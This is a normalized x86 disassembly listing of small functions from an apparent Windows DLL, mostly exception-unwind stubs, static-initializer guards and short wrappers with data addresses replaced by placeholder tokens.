sub_1001972b
mov eax r--data
retn
sub_10019731
mov ecx rw-data
call sub_10003c35
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_1001974d
push esi
mov esi ecx
call sub_1001976d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_10003cc4
sub_1001976d
mov eax sub_10019cd8
call sub_10004904
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_10017f58
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_10019796
mov eax r--data
retn
sub_1001979c
call sub_100197a6
jmp sub_100197b5
sub_100197a6
push 0x40
push 0x10
mov ecx rw-data
call sub_10003bd1
retn
sub_100197b5
push sub_100197c1
call sub_1000487d
pop ecx
retn
sub_100197c1
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_10003bf9
sub_100197dc
call sub_100197e6
jmp sub_100197f5
sub_100197e6
push 0x40
push 0x8
mov ecx rw-data
call sub_10003bd1
retn
sub_100197f5
push sub_10019801
call sub_1000487d
pop ecx
retn
sub_10019801
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_10003bf9
sub_100198d1
add ecx 0x50
push ecx
call sub_1001795d
retn
sub_10019908
call sub_10013b81
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_10019930
lea ecx [ ebp - 0x1ac ]
jmp sub_100135ac
sub_1001993b
mov eax r--data
jmp sub_10004311
sub_10019948
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019950
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_100144cd
sub_1001995b
mov eax r--data
jmp sub_10004311
sub_10019968
lea ecx [ ebp + 0x8 ]
jmp sub_100144cd
sub_10019970
mov eax r--data
jmp sub_10004311
sub_1001997c
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019984
mov eax r--data
jmp sub_10004311
sub_10019990
push [ ebp - 0x10 ]
call sub_1001845e
retn
sub_10019999
mov eax r--data
jmp sub_10004311
sub_100199a4
push [ ebp - 0x10 ]
call sub_1001845e
retn
sub_100199ad
mov eax r--data
jmp sub_10004311
sub_100199b8
mov eax r--data
jmp sub_10004311
sub_100199c4
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_1001335f
sub_100199cf
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_1001335f
sub_100199da
mov eax r--data
jmp sub_10004311
sub_100199e4
mov eax r--data
jmp sub_10004311
sub_100199f0
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_1001335f
sub_100199fb
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_1001335f
sub_10019a06
mov eax r--data
jmp sub_10004311
sub_10019a10
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019a18
mov eax r--data
jmp sub_10004311
sub_10019a24
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019a3a
mov eax r--data
jmp sub_10004311
sub_10019a44
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019a4c
mov eax r--data
jmp sub_10004311
sub_10019a58
mov eax r--data
jmp sub_10004311
sub_10019a64
lea ecx [ ebp - 0x10 ]
jmp sub_100144cd
sub_10019a6c
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_100144cd
sub_10019a83
mov eax r--data
jmp sub_10004311
sub_10019a90
lea ecx [ ebp - 0x10 ]
jmp sub_100144cd
sub_10019a98
mov eax [ ebp - 0x14 ]
and eax 0x1
test eax eax
je r-xdata
retn
mov ecx [ ebp + 0x8 ]
jmp sub_100144cd
sub_10019aaf
mov eax r--data
jmp sub_10004311
sub_10019abc
lea ecx [ ebp - 0x10 ]
jmp sub_100144cd
sub_10019ac4
lea ecx [ ebp + 0x10 ]
jmp sub_100144cd
sub_10019acc
mov eax r--data
jmp sub_10004311
sub_10019ad8
push [ ebp - 0x14 ]
call sub_10003849
retn
sub_10019ae1
mov ecx [ ebp - 0x14 ]
jmp sub_100038ce
sub_10019ae9
mov ecx [ ebp - 0x14 ]
add ecx 0x10
jmp sub_100144cd
sub_10019af4
mov eax r--data
jmp sub_10004311
sub_10019b00
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019b08
mov eax r--data
jmp sub_10004311
sub_10019b14
mov eax r--data
jmp sub_10004311
sub_10019b20
push [ ebp + 0x8 ]
call sub_10014657
pop ecx
retn
sub_10019b2a
mov eax r--data
jmp sub_10004311
sub_10019b34
mov eax r--data
jmp sub_10004311
sub_10019b40
mov ecx [ ebp - 0x10 ]
jmp sub_10014aa3
sub_10019b48
mov eax r--data
jmp sub_10004311
sub_10019b54
mov eax r--data
jmp sub_10004311
sub_10019b60
lea ecx [ ebp - 0x8 ]
jmp sub_10003bc4
sub_10019b68
mov eax r--data
jmp sub_10004311
sub_10019b74
lea ecx [ ebp - 0x24 ]
jmp sub_10017ae6
sub_10019b7c
lea ecx [ ebp - 0x60 ]
jmp sub_10015a27
sub_10019b84
lea ecx [ ebp - 0x24 ]
jmp sub_10017ae6
sub_10019b8c
mov eax r--data
jmp sub_10004311
sub_10019b98
lea ecx [ ebp - 0x48 ]
jmp sub_10015a27
sub_10019ba0
mov eax r--data
jmp sub_10004311
sub_10019bac
push [ ebp - 0x10 ]
call sub_10003849
retn
sub_10019bb5
mov eax r--data
jmp sub_10004311
sub_10019bc0
push [ ebp - 0x10 ]
call sub_10017424
pop ecx
retn
sub_10019bca
mov eax r--data
jmp sub_10004311
sub_10019bd4
push [ ebp - 0x10 ]
call sub_1001845e
retn
sub_10019bdd
mov eax r--data
jmp sub_10004311
sub_10019be8
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019bf0
mov eax r--data
jmp sub_10004311
sub_10019bfc
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019c04
mov eax r--data
jmp sub_10004311
sub_10019c10
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019c18
mov eax r--data
jmp sub_10004311
sub_10019c24
mov eax r--data
jmp sub_10004311
sub_10019c30
lea ecx [ ebp - 0x10 ]
jmp sub_100144cd
sub_10019c38
mov eax r--data
jmp sub_10004311
sub_10019c44
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019c4c
mov eax r--data
jmp sub_10004311
sub_10019c58
push [ ebp + 0x8 ]
call sub_10014657
pop ecx
retn
sub_10019c62
mov eax r--data
jmp sub_10004311
sub_10019c6c
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019c74
mov eax r--data
jmp sub_10004311
sub_10019c80
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019c88
mov eax r--data
jmp sub_10004311
sub_10019c94
push [ ebp + 0x8 ]
call sub_10014657
pop ecx
retn
sub_10019c9e
mov eax r--data
jmp sub_10004311
sub_10019ca8
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019cb0
mov eax r--data
jmp sub_10004311
sub_10019cbc
push [ ebp + 0x8 ]
call sub_10014657
pop ecx
retn
sub_10019cc6
mov eax r--data
jmp sub_10004311
sub_10019cd0
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019cd8
mov eax r--data
jmp sub_10004311
sub_10019ce4
mov ecx [ ebp - 0x10 ]
jmp sub_100038ce
sub_10019cec
mov eax r--data
jmp sub_10004311
